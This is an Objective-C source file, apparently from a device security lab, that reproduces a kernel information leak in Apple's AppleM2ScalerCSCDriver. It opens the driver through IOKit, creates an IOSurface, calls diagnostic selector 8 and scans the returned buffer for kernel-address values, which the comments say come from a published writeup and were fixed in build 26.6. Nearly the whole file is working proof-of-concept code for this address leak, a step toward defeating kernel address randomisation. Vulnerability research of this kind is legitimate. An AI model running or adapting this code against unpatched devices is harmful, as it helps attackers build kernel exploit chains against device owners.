//
//  P098M2ScalerDiag.m — AppleM2ScalerCSCDriver get_iosaDiag event_payload leak.
//  vschko/CaseStudies writeup mechanics; implementation is ours (dlsym only).
//  READ-ONLY: one selector call, no writes, no grooming.
//

#import "P098M2ScalerDiag.h"

#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <dlfcn.h>
#import <string.h>
#import <fcntl.h>
#import <unistd.h>
#import <errno.h>
#import "LabLocalTime.h"
#import "LabDeviceProfile.h"

#define P098_BUILD @"p098-m2scaler-v1"

/* dlsym prototypes (local per P059/P032 convention) */
typedef CFMutableDictionaryRef (*IOServiceMatching_t)(const char *);
typedef io_service_t (*IOServiceGetMatchingService_t)(mach_port_t, CFDictionaryRef);

#pragma mark - log helpers

static int g_p098_fd = -1;
static NSMutableString *g_p098_buf;

static void p098_flush_line(NSString *out) {
    if (g_p098_buf) [g_p098_buf appendString:out];
    if (g_p098_fd >= 0) {
        const char *s = out.UTF8String;
        if (s) {
            write(g_p098_fd, s, strlen(s));
            fcntl(g_p098_fd, F_FULLFSYNC);
        }
    }
}

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (![line hasSuffix:@"\n"]) line = [line stringByAppendingString:@"\n"];
    @synchronized ([P098M2ScalerDiag class]) { p098_flush_line(line); }
}

static BOOL p098_kernelish(uint64_t v) {
    return (v >= 0xFFFFFE0000000000ULL && v < 0xFFFFFFF000000000ULL) ||
           (v >= 0xFFFFFFF000000000ULL);
}

@implementation P098M2ScalerDiag

+ (NSString *)tap {
    @synchronized ([P098M2ScalerDiag class]) {
        g_p098_buf = [NSMutableString string];
        NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        NSString *path = [docs stringByAppendingPathComponent:@"p098_m2scaler_diag_log.txt"];
        g_p098_fd = open(path.fileSystemRepresentation, O_CREAT | O_WRONLY | O_APPEND, 0644);

        L(@"=== p098 session %@ BUILD %@ ===", LabLocalMilitaryNow() ?: @"?", P098_BUILD);
        L(@"M2ScalerCSC iosaDiag event_payload IOSurface KVA leak (vschko writeup,");
        L(@"possibly CVE-2026-64709). Fixed 26.6 (23G71). Raw dump + candidate scan;");
        L(@"parse is best-effort, nothing auto-trusted.");
        L(@"%@", [LabDeviceProfile identBlock] ?: @"ident ?");

        void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
        if (!iokit) iokit = RTLD_DEFAULT;
        IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
        IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
        kern_return_t (*pOpen)(io_service_t, task_port_t, uint32_t, io_connect_t *) =
            dlsym(iokit, "IOServiceOpen");
        kern_return_t (*pClose)(io_connect_t, uint32_t, uint32_t) = dlsym(iokit, "IOServiceClose");
        IOReturn (*pCallStruct)(mach_port_t, uint32_t, const void *, size_t, void *, size_t *) =
            dlsym(iokit, "IOConnectCallStructMethod");
        IOReturn (*pObjRelease)(io_object_t) = dlsym(iokit, "IOObjectRelease");
        mach_port_t (*pPortGetMain)(void) = dlsym(iokit, "kIOMainPortDefault");
        // IOSurface is dlsym-only per AGENTS.md (no header import).
        void *iosurf = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
        if (!iosurf) iosurf = RTLD_DEFAULT;
        void *(*pSurfCreate)(CFDictionaryRef) = dlsym(iosurf, "IOSurfaceCreate");
        size_t (*pSurfAllocSize)(void *) = dlsym(iosurf, "IOSurfaceGetAllocSize");
        void (*pSurfRelease)(void *) = dlsym(iosurf, "CFRelease");
        CFStringRef (*pKeyWidth)(void) = dlsym(iosurf, "kIOSurfaceWidth");
        CFStringRef (*pKeyHeight)(void) = dlsym(iosurf, "kIOSurfaceHeight");
        CFStringRef (*pKeyBPE)(void) = dlsym(iosurf, "kIOSurfaceBytesPerElement");
        CFStringRef (*pKeyBPR)(void) = dlsym(iosurf, "kIOSurfaceBytesPerRow");
        CFStringRef (*pKeyAlloc)(void) = dlsym(iosurf, "kIOSurfaceAllocSize");

        if (!pMatching || !pGet || !pOpen || !pCallStruct) {
            L(@"[-] IOKit dlsym incomplete - honest miss.");
            goto finish;
        }
        if (!pSurfCreate || !pKeyWidth || !pKeyHeight || !pKeyBPE || !pKeyBPR || !pKeyAlloc) {
            L(@"[-] IOSurface dlsym incomplete - honest miss.");
            goto finish;
        }

        /* Scoped body: ARC forbids jumping over ObjC declarations in scope
           at the label, so everything between here and finish: lives in its
           own block. */
        {
        mach_port_t mainPort = 0;
        if (pPortGetMain) mainPort = *(mach_port_t *)pPortGetMain;

        CFMutableDictionaryRef matching = pMatching("AppleM2ScalerCSCDriver");
        io_service_t svc = matching ? pGet(mainPort, matching) : 0;
        if (!svc) {
            L(@"[-] AppleM2ScalerCSCDriver not present on this SKU - honest miss");
            L(@"[-] (driver population varies; absence is a real result, not a bug).");
            goto finish;
        }
        L(@"[*] AppleM2ScalerCSCDriver service found.");

        io_connect_t conn = 0;
        kern_return_t kr = pOpen(svc, mach_task_self(), 0, &conn);
        L(@"[*] IOServiceOpen(type=0) kr=0x%x conn=%d", kr, conn);
        if (kr != KERN_SUCCESS || !conn) {
            L(@"[-] open rejected (entitlement/sandbox boundary) - honest miss.");
            if (pObjRelease) pObjRelease(svc);
            goto finish;
        }

        // One IOSurface so a queueAndExecute-style log entry exists to read.
        NSDictionary *props = @{
            (__bridge id)pKeyWidth(): @256,
            (__bridge id)pKeyHeight(): @1,
            (__bridge id)pKeyBPE(): @4,
            (__bridge id)pKeyBPR(): @1024,
            (__bridge id)pKeyAlloc(): @1024
        };
        void *surf = pSurfCreate((__bridge CFDictionaryRef)props);
        L(@"[*] IOSurfaceCreate -> %@ alloc=%zu", surf ? @"OK" : @"FAIL",
          surf ? pSurfAllocSize(surf) : 0);

        // Selector 8 = user_get_iosaDiag. Input shape unknown on this build:
        // try the natural {user VA of out-buffer, size} pair; the driver
        // copies entries into the mapped output. All failures are honest.
        static uint8_t outBuf[0x4000];
        memset(outBuf, 0, sizeof(outBuf));
        uint64_t inS[2] = { (uint64_t)(uintptr_t)outBuf, sizeof(outBuf) };
        size_t outLen = sizeof(outBuf);
        kr = pCallStruct(conn, 8, inS, sizeof(inS), outBuf, &outLen);
        L(@"[*] sel=8 stIn={va=0x%llx,size=0x%x} kr=0x%x outLen=%zu (0x%x)",
          (unsigned long long)inS[0], (unsigned)sizeof(inS), kr, outLen, (unsigned)outLen);

        if (kr == KERN_SUCCESS && outLen) {
            // Raw dump of the first 0x100 bytes.
            L(@"[*] diag out head (0x100 of 0x%x bytes):", (unsigned)outLen);
            for (uint32_t row = 0; row < 0x100; row += 16) {
                NSString *hex = @"";
                for (uint32_t i = 0; i < 16; i++) {
                    hex = [hex stringByAppendingFormat:@"%02x%s", outBuf[row + i],
                           (i == 15) ? "" : " "];
                }
                L(@"[*] +0x%04x: %@", row, hex);
            }
            // Candidate scan: kernel-range qwords anywhere in the output.
            // Writeup: event_payload sits at entry+0x18 and holds an IOSurface
            // KVA (zone-range 0xffffffe...). We scan ALL qwords - honest.
            int cands = 0;
            for (size_t off = 0; off + 8 <= outLen && cands < 8; off += 8) {
                uint64_t v;
                memcpy(&v, outBuf + off, 8);
                if (p098_kernelish(v)) {
                    cands++;
                    L(@"[+] CANDIDATE @+0x%04zx = 0x%016llx (kernel-range qword)", off,
                      (unsigned long long)v);
                }
            }
            if (!cands) {
                L(@"[-] no kernel-range qwords in diag output (perm-stripped on this");
                L(@"[-] build, wrong input shape, or driver hardened) - honest miss.");
            } else {
                L(@"[*] candidates are UNVERIFIED. If a +0x18 payload matches the");
                L(@"[*] just-created IOSurface's KVA neighborhood, the leak is live.");
            }
        } else if (kr == 0xe00002c2 || kr == KERN_INVALID_CAPABILITY) {
            L(@"[-] sel=8 rejected (0x%08x) - selector not exposed on this SKU/build.", kr);
        } else {
            L(@"[-] sel=8 failed kr=0x%x - input shape may differ; honest miss.", kr);
        }

        if (surf && pSurfRelease) pSurfRelease(surf);
        if (pClose && conn) pClose(conn, 0, 0);
        if (pObjRelease) pObjRelease(svc);
        }

finish:
        if (g_p098_fd >= 0) { close(g_p098_fd); g_p098_fd = -1; }
        NSString *out = [g_p098_buf copy];
        g_p098_buf = nil;
        return out;
    }
}

@end